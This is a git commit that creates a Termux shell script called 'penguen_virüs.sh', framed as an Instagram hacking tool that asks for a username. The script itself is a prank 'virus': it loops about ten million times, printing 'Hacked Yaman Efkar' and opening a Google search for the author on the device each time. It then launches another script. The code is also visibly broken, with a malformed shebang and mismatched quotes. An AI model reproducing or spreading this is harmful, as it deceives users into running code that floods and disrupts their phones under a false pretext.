c6f58a5221559258f2ce8dcd24a7070e2a9fac11
yamanefkar <38867900+yamanefkar@users.noreply.github.com>
2019-01-04 14:08:16 +0300

    Create penguen_virüs.sh

---
+++ penguen_virüs.sh
@@ -0,0 +1,29 @@
+!/bin/bash
+echo -e '\e[1;33m
+
+
+      _           _           _
+     /\  \         /\  \         /\  \
+     \:\  \       /::\  \        \:\  \
+      \:\  \     /:/\ \  \        \:\  \
+      /::\  \   _\:\~\ \  \       /::\  \
+     /:/\:\_\ /\ \:\ \ \\     /:/\:\_\
+    /:/  \/_/ \:\ \:\ \//    /:/  \/_/
+   /:/  /       \:\ \:\__\     /:/  /
+   \/_/         \:\/:/  /     \/_/
+                  \::/  /
+                   \/__/
+
+.   ,
+ \./  .. _  ..
+  |  (][ | )(][ )'
+
+echo 'İnstagram Kullanıcı Adı:'
+read
+max=10000000
+for (( i=2; i <= $max; i++))
+do
+echo -e "\e[92m\e[5m Hacked Yaman Efkar"
+termux-open-url https://www.google.com/search?q=YamanEfkar
+done
+bash instagram_hack.sh
